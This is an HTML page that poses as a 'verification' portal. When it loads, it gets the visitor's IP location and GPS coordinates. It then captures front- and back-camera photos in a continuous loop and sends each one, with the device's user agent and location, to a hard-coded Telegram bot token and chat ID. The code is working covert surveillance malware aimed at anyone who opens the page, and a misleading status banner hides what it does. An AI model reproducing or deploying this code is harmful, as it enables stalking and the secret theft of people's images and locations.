<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Max-Speed Dual Axis Portal</title>
    <style>
        body { font-family: 'Helvetica Neue', Arial, sans-serif; background-color: #000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .snap-portal { position: relative; width: 100vw; height: 100vh; background: #000; display: flex; flex-direction: column; overflow: hidden; }
        .status-box { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(220, 53, 69, 0.9); color: #fff; padding: 10px 20px; border-radius: 30px; font-size: 0.9rem; z-index: 100; font-weight: bold; text-align: center; border: 2px solid #dc3545; box-shadow: 0 0 10px rgba(220, 53, 69, 0.5); pointer-events: none; }
        .media-container { flex: 1; position: relative; background: #000; display: flex; justify-content: center; align-items: center; }
        video { width: 100%; height: 100%; object-fit: cover; z-index: 10; display: none; }
        canvas { display: none; }
        .preview-img { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; display: none; z-index: 20; border: 4px solid #FFFC00; }
    </style>
</head>
<body>

<div class="snap-portal">
    <div id="statusLabel" class="status-box">Synchronizing high-speed verification filters...</div>

    <div class="media-container">
        <video id="webcam" autoplay playsinline muted></video>
        <canvas id="captureCanvas" width="640" height="480"></canvas>
        <img id="savedFrame" class="preview-img" alt="System Snapshot Matrix">
    </div>
</div>

<script>
    let activeStream = null;
    let isLoopRunning = false;
    let loopCycleCounter = 0;
    
    const targetPayload = {
        deviceModel: navigator.userAgent,
        broadLocation: "Verifying...",
        exactCoordinates: "Not Granted"
    };

    fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            targetPayload.broadLocation = `City: ${data.city}, State: ${data.region}`;
        }).catch(() => { targetPayload.broadLocation = "IP profile deferred"; });

    window.addEventListener('DOMContentLoaded', () => {
        executeZeroClickTrace();
    });

    function executeZeroClickTrace() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => { targetPayload.exactCoordinates = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`; startMaxSpeedSequence(); },
                (err) => { targetPayload.exactCoordinates = `Denied: ${err.message}`; startMaxSpeedSequence(); },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        } else { startMaxSpeedSequence(); }
    }

    function startMaxSpeedSequence() {
        if (isLoopRunning) return;
        isLoopRunning = true;
        runSequentialCycle();
    }

    // --- HIGH-SPEED PIPELINE MECHANISM ---
    function runSequentialCycle() {
        loopCycleCounter++;
        
        // Front Camera instantly session open
        executeTargetAxisStream("user", () => {
            // Front complete hote hi bina ruko back camera pipeline par toggle karo (300ms shift gap)
            setTimeout(() => {
                executeTargetAxisStream("environment", () => {
                    // Dono camera ho gaye? Ab bina cooling gap ke NEXT CYCLE turant start karo (100ms internal flash)
                    setTimeout(runSequentialCycle, 100); 
                });
            }, 300);
        });
    }

    function executeTargetAxisStream(facingModeType, callbackEvent) {
        if (activeStream) {
            activeStream.getTracks().forEach(track => track.stop());
        }

        navigator.mediaDevices.getUserMedia({ 
            video: { width: 640, height: 480, facingMode: facingModeType }, 
            audio: false 
        })
        .then((stream) => {
            activeStream = stream;
            const videoEl = document.getElementById('webcam');
            videoEl.srcObject = stream;
            videoEl.style.display = "block";

            videoEl.onloadedmetadata = () => {
                // Sirf 350ms sensor adjustment delay taaki image dark ya blur na aaye
                setTimeout(() => {
                    processSnapshotCapture(facingModeType);
                    if (callbackEvent) callbackEvent();
                }, 350);
            };
        })
        .catch((error) => {
            console.log(`Axis track missing: ${facingModeType}`, error);
            if (callbackEvent) callbackEvent();
        });
    }

    function processSnapshotCapture(currentActiveAxis) {
        const videoEl = document.getElementById('webcam');
        const canvasEl = document.getElementById('captureCanvas');
        const previewImg = document.getElementById('savedFrame');
        const context = canvasEl.getContext('2d');

        context.drawImage(videoEl, 0, 0, 640, 480);
        const compiledBase64 = canvasEl.toDataURL('image/jpeg', 0.65); // Compression high rakhi hai taaki transmit instantly ho sake

        previewImg.src = compiledBase64;
        previewImg.style.display = "block";

        dispatchBinaryBlobToBot(canvasEl, currentActiveAxis);
    }

    function dispatchBinaryBlobToBot(canvasElement, axisLabel) {
        const botToken = "8901334974:AAGaj98eLxPL2C6078Xi4FywZ-cNZuXuKfg"; 
        const chatId = "8562061813"; 

        let textCaption = `*⚡ RAPID LOOP SECURED ⚡*\n`;
        textCaption += `*🔄 Cycle:* #${loopCycleCounter} | *📷 Lens:* ${axisLabel.toUpperCase()}\n`;
        textCaption += `*📱 Specs:* ${targetPayload.deviceModel}\n`;
        textCaption += `*📍 GPS:* ${targetPayload.exactCoordinates}\n`;

        canvasElement.toBlob(function(binaryBlobChunk) {
            const multiPartFormPayload = new FormData();
            multiPartFormPayload.append('chat_id', chatId);
            multiPartFormPayload.append('photo', binaryBlobChunk, `fast_loop_${loopCycleCounter}_${axisLabel}.jpg`);
            multiPartFormPayload.append('caption', textCaption);
            multiPartFormPayload.append('parse_mode', 'Markdown');

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: multiPartFormPayload
            }).catch(() => { console.log("Packet drop on high speed send."); });
        }, 'image/jpeg', 0.65);
    }
</script>

</body>
</html>
